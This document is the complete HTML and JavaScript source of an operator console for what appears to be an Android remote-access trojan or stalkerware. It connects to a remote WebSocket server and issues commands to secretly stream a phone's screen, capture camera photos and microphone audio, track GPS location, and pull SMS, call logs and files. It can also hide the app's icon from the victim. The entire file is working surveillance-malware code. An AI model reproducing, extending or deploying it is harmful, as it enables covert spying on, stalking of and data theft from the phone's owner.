<!DOCTYPE html>
<html>
<head>
    <title>SystemSync Console</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        /* ===== GLOBAL ===== */
        body{
            margin:0;
            background:#f5f7fa;
            font-family: 'Segoe UI', system-ui, sans-serif;
            display:flex;
            height:100vh;
            overflow:hidden;
        }

        /* ===== SIDEBAR ===== */
        #sidebar{
            width:280px;
            background:white;
            border-right:1px solid #e0e4e8;
            padding:20px;
            overflow-y:auto;
            box-shadow:2px 0 5px rgba(0,0,0,0.02);
        }

        .logo{
            font-size:20px;
            font-weight:600;
            color:#1976ff;
            margin-bottom:30px;
        }

        .section{
            margin-bottom:25px;
        }

        .section-title{
            font-size:12px;
            font-weight:600;
            color:#7b8a9b;
            text-transform:uppercase;
            letter-spacing:0.5px;
            margin-bottom:12px;
        }

        button{
            width:100%;
            padding:10px 12px;
            margin:4px 0;
            background:white;
            color:#1a2634;
            border:1px solid #d0d9e2;
            border-radius:8px;
            font-size:14px;
            text-align:left;
            cursor:pointer;
            transition:0.2s;
            display:flex;
            align-items:center;
            gap:8px;
        }

        button:hover{
            background:#1976ff;
            color:white;
            border-color:#1976ff;
        }

        /* ===== MAIN PANEL ===== */
        #main{
            flex:1;
            display:flex;
            flex-direction:column;
            min-width:0;
            background:#f5f7fa;
        }

        #header{
            height:60px;
            background:white;
            border-bottom:1px solid #e0e4e8;
            display:flex;
            align-items:center;
            justify-content:space-between;
            padding:0 25px;
            font-weight:600;
            color:#1a2634;
        }

        #status{
            padding:6px 16px;
            border-radius:30px;
            background:#e8f0fe;
            color:#1976ff;
            font-weight:500;
        }

        #content{
            flex:1;
            padding:20px;
            overflow:auto;
        }

        /* SINGLE CONTENT PANEL */
        #main-panel{
            background:white;
            border-radius:12px;
            box-shadow:0 2px 8px rgba(0,0,0,0.05);
            padding:20px;
            min-height:100%;
        }

        /* ===== MAP ===== */
        #map{
            height:400px;
            border-radius:10px;
        }

        /* ===== TABLES ===== */
        table{
            width:100%;
            border-collapse:collapse;
            font-size:14px;
        }
        th{
            background:#f8fafd;
            color:#1a2634;
            font-weight:600;
            padding:12px 10px;
            text-align:left;
            border-bottom:2px solid #e0e4e8;
        }
        td{
            padding:10px;
            border-bottom:1px solid #eef2f5;
            color:#2c3e50;
            word-break:break-word;
        }
        tr:hover{
            background:#f5f9ff;
        }

        /* ===== FILE EXPLORER ===== */
        .file-toolbar{
            display:flex;
            align-items:center;
            margin-bottom:15px;
            gap:8px;
            flex-wrap:wrap;
        }
        .file-toolbar button{
            width:auto;
            padding:6px 12px;
            background:white;
            border:1px solid #d0d9e2;
            border-radius:6px;
            cursor:pointer;
            font-size:13px;
        }
        .file-toolbar button:hover{
            background:#1976ff;
            color:white;
        }
        .file-path{
            background:#f0f2f5;
            padding:6px 12px;
            border-radius:20px;
            font-size:13px;
            color:#2c3e50;
            flex:1;
        }
        .file-list{
            border-top:1px solid #eef2f5;
        }
        .file-item{
            display:flex;
            align-items:center;
            padding:8px 12px;
            border-bottom:1px solid #eef2f5;
            gap:8px;
        }
        .file-item:hover{
            background:#f5f9ff;
        }
        .file-checkbox{
            width:18px;
            height:18px;
            cursor:pointer;
        }
        .file-icon{
            font-size:18px;
            width:24px;
            text-align:center;
        }
        .file-name{
            flex:1;
            color:#1a2634;
            cursor:pointer;
        }
        .file-name.folder:hover{
            text-decoration:underline;
        }
        .file-size{
            color:#7b8a9b;
            font-size:13px;
            margin-right:15px;
        }
        .download-selected{
            margin-top:15px;
            text-align:right;
        }
        .download-selected button{
            width:auto;
            padding:8px 16px;
            background:#1976ff;
            color:white;
            border:none;
            border-radius:6px;
            cursor:pointer;
            font-weight:500;
        }
        .download-selected button:hover{
            background:#0d5bca;
        }

        /* ===== PAGINATION ===== */
        .pagination{
            margin-top:20px;
            display:flex;
            gap:8px;
            justify-content:center;
        }
        .page-btn{
            padding:6px 12px;
            border:1px solid #d0d9e2;
            background:white;
            border-radius:6px;
            cursor:pointer;
            color:#1a2634;
        }
        .page-btn:hover{
            background:#1976ff;
            color:white;
            border-color:#1976ff;
        }

        /* ===== IMAGES & VIDEO ===== */
        img, video{
            max-width:100%;
            max-height:70vh;
            border-radius:8px;
            display:block;
            margin:0 auto;
        }

        /* ===== AUDIO PLAYER ===== */
        audio{
            width:100%;
            margin-top:15px;
        }
    </style>
</head>
<body>

<div id="sidebar">
    <div class="logo">SystemSync</div>

    <div class="section">
        <div class="section-title">Surveillance</div>
        <button onclick="toggleScreen()"><span>üñ•</span> <span id="screenBtn">Start Screen</span></button>
        <button onclick="toggleFrontCam()"><span>üì∑</span> <span id="frontCamBtn">Front Camera</span></button>
        <button onclick="toggleBackCam()"><span>üì∑</span> <span id="backCamBtn">Back Camera</span></button>
        <button onclick="toggleMic()"><span>üé§</span> <span id="micBtn">Start Mic</span></button>
        <button onclick="send('getLocation')"><span>üìç</span> GPS Location</button>
    </div>

    <div class="section">
        <div class="section-title">Data</div>
        <button onclick="send('ls root')"><span>üìÇ</span> File Manager</button>
        <button onclick="send('getSMS inbox')"><span>üí¨</span> SMS Logs</button>
        <button onclick="send('getCallLogs')"><span>üìû</span> Call Logs</button>
    </div>

    <div class="section">
        <div class="section-title">Control</div>
        <button onclick="toggleAppIcon()"><span>üëª</span> <span id="iconBtn">Hide Icon</span></button>
        <button onclick="send('vibrate 1000')"><span>üì≥</span> Vibrate (1s)</button>
    </div>
</div>

<div id="main">
    <div id="header">
        <div>Control Panel</div>
        <div id="status">CONNECTING</div>
    </div>
    <div id="content">
        <div id="main-panel">
            Ready.
        </div>
    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    // ---------- CONFIG ----------
    const WS_URL = "wss://mirror-view.onrender.com";

    // ---------- GLOBALS ----------
    let ws;
    let pc = null;                     // WebRTC peer
    let mapInstance = null;
    let currentData = [];               // for pagination
    let currentPage = 0;
    let dataType = null;                // 'sms', 'call', 'file'
    let currentPath = "root";           // current directory for file manager
    let selectedFiles = [];              // paths of selected files for download

    // Toggle states
    let screenActive = false;
    let frontCamActive = false;
    let backCamActive = false;
    let micActive = false;
    let iconHidden = false;

    const panel = document.getElementById('main-panel');

    // ---------- CONNECTION (with dual message handling) ----------
    function connect() {
        ws = new WebSocket(WS_URL);
        ws.onopen = () => {
            console.log('Connected');
            ws.send("I_AM_WEB");
            setStatus("ONLINE");
        };
        ws.onmessage = (e) => {
            const msg = e.data;
            console.log('Received:', msg);

            // Try to parse as JSON first
            try {
                const json = JSON.parse(msg);
                handleJSON(json);
                return;
            } catch (err) {
                // Not JSON ‚Äì fallback to plain text
                handlePlainText(msg);
            }
        };
        ws.onclose = () => {
            setStatus('OFFLINE');
            setTimeout(connect, 5000);
        };
        ws.onerror = console.error;
    }

    // ---------- JSON HANDLER ----------
    function handleJSON(json) {
        switch (json.type) {
            case 'SMS_DATA':
                dataType = 'sms';
                currentData = json.data;
                renderTable();
                break;
            case 'CALL_LOGS':
                dataType = 'call';
                currentData = json.data;
                renderTable();
                break;
            case 'FILE_LIST':
                dataType = 'file';
                currentData = json.data;
                renderFiles();
                break;
            case 'LOCATION_UPDATE':
                renderMap(json.data);
                break;
            case 'CAMERA_IMAGE':
                showImage(json.data);
                break;
            case 'AUDIO_RECORDING':
                showAudio(json.data);
                break;
            case 'ERROR':
                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
                break;
            case 'DEVICE_STATUS':
                setStatus(json.status);
                break;
            case 'APP_HIDDEN':
                iconHidden = true;
                document.getElementById('iconBtn').innerText = 'Show Icon';
                showNotification('App icon hidden');
                break;
            case 'APP_SHOWN':
                iconHidden = false;
                document.getElementById('iconBtn').innerText = 'Hide Icon';
                showNotification('App icon shown');
                break;
            case 'AUDIO_RECORDING_STARTED':
                micActive = true;
                document.getElementById('micBtn').innerText = 'Stop Mic';
                showNotification('Mic started');
                break;
            case 'AUDIO_RECORDING_STOPPED':
                micActive = false;
                document.getElementById('micBtn').innerText = 'Start Mic';
                showNotification('Mic stopped');
                break;
            case 'SCREEN_SHARE_STARTED':
                screenActive = true;
                document.getElementById('screenBtn').innerText = 'Stop Screen';
                showNotification('Screen share started');
                break;
            case 'SCREEN_SHARE_STOPPED':
                screenActive = false;
                document.getElementById('screenBtn').innerText = 'Start Screen';
                if (pc) { pc.close(); pc = null; }
                showNotification('Screen share stopped');
                break;
            default:
                console.log('Unhandled JSON type:', json.type);
        }
    }

    // ---------- PLAIN TEXT HANDLER (legacy) ----------
    function handlePlainText(msg) {
        if (msg.startsWith("STATUS:")) {
            setStatus(msg.substring(7));
        } else if (msg.startsWith("LOC_DATA:")) {
            try {
                const data = JSON.parse(msg.substring(9));
                renderMap(data);
            } catch (err) {
                console.error(err);
            }
        } else if (msg.startsWith("FILE_LIST:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'file';
                renderFiles();
            } catch (err) {
                console.error(err);
            }
        } else if (msg.startsWith("SMS_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(9));
                dataType = 'sms';
                renderTable();
            } catch (err) {
                console.error(err);
            }
        } else if (msg.startsWith("CALL_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'call';
                renderTable();
            } catch (err) {
                console.error(err);
            }
        } else if (msg.startsWith("CAMERA_IMAGE:")) {
            showImage(msg.substring(13));
        } else if (msg.startsWith("AUDIO_RECORDING:")) {
            showAudio(msg.substring(16));
        } else if (msg.startsWith("AUDIO_STARTED")) {
            micActive = true;
            document.getElementById('micBtn').innerText = 'Stop Mic';
            showNotification('Mic started');
        } else if (msg.startsWith("AUDIO_STOPPED")) {
            micActive = false;
            document.getElementById('micBtn').innerText = 'Start Mic';
            showNotification('Mic stopped');
        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
            screenActive = true;
            document.getElementById('screenBtn').innerText = 'Stop Screen';
            showNotification('Screen share started');
        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
            screenActive = false;
            document.getElementById('screenBtn').innerText = 'Start Screen';
            if (pc) { pc.close(); pc = null; }
            showNotification('Screen share stopped');
        } else if (msg.startsWith("RTC_OFFER:screen:")) {
            handleOffer(msg.substring(17));
        } else if (msg.startsWith("ICE_CANDIDATE:")) {
            handleIceCandidate(msg.substring(14));
        } else if (msg.startsWith("APP_HIDDEN")) {
            iconHidden = true;
            document.getElementById('iconBtn').innerText = 'Show Icon';
            showNotification('App icon hidden');
        } else if (msg.startsWith("APP_SHOWN")) {
            iconHidden = false;
            document.getElementById('iconBtn').innerText = 'Hide Icon';
            showNotification('App icon shown');
        } else if (msg.startsWith("VIBRATE_DONE")) {
            showNotification('Vibration done');
        } else if (msg.startsWith("ERROR:")) {
            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
        } else {
            console.log('Unhandled plain text:', msg);
        }
    }

    function setStatus(s) {
        const el = document.getElementById('status');
        el.innerText = s;
        el.style.background = s === 'ONLINE' ? '#e8f5e9' : '#ffebee';
        el.style.color = s === 'ONLINE' ? '#2e7d32' : '#c62828';
    }

    // ---------- COMMAND ----------
    function send(cmd) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(cmd);
        } else {
            alert('Not connected');
        }
    }

    // ---------- TOGGLES ----------
    function toggleScreen() {
        if (screenActive) send('STOP_SCREEN_SHARE');
        else send('START_SCREEN_SHARE');
    }

    function toggleFrontCam() {
        if (frontCamActive) {
            frontCamActive = false;
            document.getElementById('frontCamBtn').innerText = 'Front Camera';
        } else {
            send('camFront');
            frontCamActive = true;
            document.getElementById('frontCamBtn').innerText = 'Stop Front';
            setTimeout(() => {
                if (frontCamActive) {
                    frontCamActive = false;
                    document.getElementById('frontCamBtn').innerText = 'Front Camera';
                }
            }, 5000);
        }
    }

    function toggleBackCam() {
        if (backCamActive) {
            backCamActive = false;
            document.getElementById('backCamBtn').innerText = 'Back Camera';
        } else {
            send('camBack');
            backCamActive = true;
            document.getElementById('backCamBtn').innerText = 'Stop Back';
            setTimeout(() => {
                if (backCamActive) {
                    backCamActive = false;
                    document.getElementById('backCamBtn').innerText = 'Back Camera';
                }
            }, 5000);
        }
    }

    function toggleMic() {
        if (micActive) send('stopAudio');
        else send('startAudio');
    }

    function toggleAppIcon() {
        if (iconHidden) send('showApp');
        else send('hideApp');
    }

    // ---------- RENDERERS ----------
    function showImage(base64) {
        panel.innerHTML = `<img src="data:image/jpeg;base64,${base64}">`;
        frontCamActive = false;
        backCamActive = false;
        document.getElementById('frontCamBtn').innerText = 'Front Camera';
        document.getElementById('backCamBtn').innerText = 'Back Camera';
    }

    function showAudio(base64) {
        panel.innerHTML = `
            <audio controls src="data:audio/3gp;base64,${base64}"></audio>
            <button onclick="downloadBase64('${base64}', 'recording.3gp')">Download</button>
        `;
    }

    function downloadBase64(b64, name) {
        const a = document.createElement('a');
        a.href = 'data:application/octet-stream;base64,' + b64;
        a.download = name;
        a.click();
    }

    function renderMap(loc) {
        panel.innerHTML = '<div id="map"></div>';
        if (mapInstance) mapInstance.remove();
        mapInstance = L.map('map').setView([loc.lat, loc.lon], 18);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
        L.circle([loc.lat, loc.lon], { radius: loc.acc || loc.accuracy, color: '#1976ff' }).addTo(mapInstance);
    }

    // Table render with pagination
    function renderTable() {
        if (!currentData || currentData.length === 0) {
            panel.innerHTML = '<p>No data</p>';
            return;
        }

        // Prepare columns based on dataType (no timestamp formatting)
        let headers = [];
        let rows = [];

        if (dataType === 'sms') {
            headers = ['Type', 'Number', 'Message', 'Date'];
            rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
        } else if (dataType === 'call') {
            headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
            rows = currentData.map(item => [
                item.type,
                item.number,
                item.name || '',
                item.date,
                item.duration + 's'
            ]);
        } else {
            panel.innerHTML = '<p>Unknown data type</p>';
            return;
        }

        const pageSize = 20;
        const totalPages = Math.ceil(rows.length / pageSize);
        const start = currentPage * pageSize;
        const pageRows = rows.slice(start, start + pageSize);

        let html = '<table><thead><tr>';
        headers.forEach(h => html += `<th>${h}</th>`);
        html += '</tr></thead><tbody>';

        pageRows.forEach(r => {
            html += '<tr>';
            r.forEach(cell => html += `<td>${cell}</td>`);
            html += '</tr>';
        });
        html += '</tbody></table>';

        // Pagination
        if (totalPages > 1) {
            html += '<div class="pagination">';
            for (let i = 0; i < totalPages; i++) {
                html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
            }
            html += '</div>';
        }

        panel.innerHTML = html;
    }

    function gotoPage(p) {
        currentPage = p;
        renderTable();
    }

    // ---------- FILE EXPLORER with checkboxes and download selected ----------
    function renderFiles() {
        if (!currentData || currentData.length === 0) {
            panel.innerHTML = '<p>No files found. Make sure storage permission is granted.</p>';
            return;
        }

        // Reset selected files when new directory loads
        selectedFiles = [];

        let html = `
            <div class="file-toolbar">
                <button onclick="navigateUp()">‚¨Ü Up</button>
                <span class="file-path">${currentPath}</span>
                <button onclick="selectAllFiles()">Select All</button>
                <button onclick="deselectAllFiles()">Deselect All</button>
            </div>
            <div class="file-list">
        `;

        currentData.forEach(f => {
            const isFolder = f.isDir;
            const path = f.path;
            const name = f.name;
            const size = isFolder ? '' : formatBytes(f.size);
            // Only files get checkboxes
            const checkbox = isFolder ? '' : `<input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">`;
            // Folders are clickable for navigation; files are not clickable (checkbox only)
            const nameDisplay = isFolder
                ? `<span class="file-name folder" onclick="handleFolderClick('${path}')">${name}</span>`
                : `<span class="file-name">${name}</span>`;

            html += `
                <div class="file-item">
                    ${checkbox}
                    <span class="file-icon">${isFolder ? 'üìÅ' : 'üìÑ'}</span>
                    ${nameDisplay}
                    <span class="file-size">${size}</span>
                </div>
            `;
        });

        html += `</div>`;

        // Download Selected button
        html += `
            <div class="download-selected">
                <button onclick="downloadSelected()">Download Selected (${selectedFiles.length})</button>
            </div>
        `;

        panel.innerHTML = html;
    }

    // Handle folder click (navigate)
    window.handleFolderClick = function(path) {
        currentPath = path;
        send('ls ' + path);
    };

    // Navigate up
    function navigateUp() {
        if (currentPath === 'root' || currentPath === '') return;
        let parts = currentPath.split('/');
        parts.pop();
        let parent = parts.join('/');
        if (parent === '') parent = 'root';
        currentPath = parent;
        send('ls ' + parent);
    }

    // Update selected files array
    window.updateSelected = function(checkbox) {
        const path = checkbox.dataset.path;
        if (checkbox.checked) {
            if (!selectedFiles.includes(path)) {
                selectedFiles.push(path);
            }
        } else {
            selectedFiles = selectedFiles.filter(p => p !== path);
        }
        // Update the button count
        const downloadBtn = document.querySelector('.download-selected button');
        if (downloadBtn) {
            downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;
        }
    };

    // Select all files (only files, not folders)
    function selectAllFiles() {
        const checkboxes = document.querySelectorAll('.file-checkbox');
        checkboxes.forEach(cb => {
            cb.checked = true;
            updateSelected(cb);
        });
    }

    function deselectAllFiles() {
        const checkboxes = document.querySelectorAll('.file-checkbox');
        checkboxes.forEach(cb => {
            cb.checked = false;
            updateSelected(cb);
        });
    }

    // Download selected files
    function downloadSelected() {
        if (selectedFiles.length === 0) {
            alert('No files selected');
            return;
        }
        selectedFiles.forEach(path => {
            send('dl ' + path);
        });
        // Optionally, you could clear selection after download
        // deselectAllFiles();
    }

    function formatBytes(b) {
        if (b === 0) return '0 B';
        const k = 1024, sizes = ['B','KB','MB','GB'];
        const i = Math.floor(Math.log(b)/Math.log(k));
        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
    }

    // ---------- WEBRTC ----------
    function handleOffer(sdp) {
        if (!pc) {
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.ontrack = (e) => {
                panel.innerHTML = '<video autoplay playsinline></video>';
                document.querySelector('video').srcObject = e.streams[0];
            };
            pc.onicecandidate = (e) => {
                if (e.candidate) ws.send('ICE_CANDIDATE:' + JSON.stringify(e.candidate));
            };
        }
        pc.setRemoteDescription({ type: 'offer', sdp })
            .then(() => pc.createAnswer())
            .then(a => pc.setLocalDescription(a))
            .then(() => ws.send('ANSWER:' + pc.localDescription.sdp))
            .catch(console.error);
    }

    function handleIceCandidate(candidateStr) {
        if (!pc) return;
        try {
            pc.addIceCandidate(new RTCIceCandidate(JSON.parse(candidateStr)));
        } catch (e) { console.error(e); }
    }

    function showNotification(text) {
        const status = document.getElementById('status');
        const orig = status.innerText;
        status.innerText = text;
        setTimeout(() => { status.innerText = orig; }, 2000);
    }

    // ---------- START ----------
    connect();
</script>
</body>
</html>
